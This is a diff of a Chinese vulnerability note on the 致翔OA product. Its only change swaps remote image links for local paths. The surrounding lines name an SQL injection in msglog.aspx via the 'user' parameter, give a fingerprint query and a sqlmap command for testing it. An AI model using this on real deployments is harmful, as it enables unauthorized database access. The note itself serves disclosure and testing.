@@ -20,7 +20,7 @@ app="致翔软件-致翔OA"
 
 产品页面
 
-![image-20220520142109952](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201421236.png)
+![image-20220520142109952](./images/202205201421236.png)
 
 存在漏洞的文件为 `msglog.aspx`,涉及注入的参数为 user
 
@@ -34,4 +34,4 @@ SQLMap跑一下
 sqlmap -u http://127.0.0.1/mainpage/msglog.aspx?user=1 -p user --batch
 ```
 
-![image-20220520142130999](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201421211.png)
+![image-20220520142130999](./images/202205201421211.png)
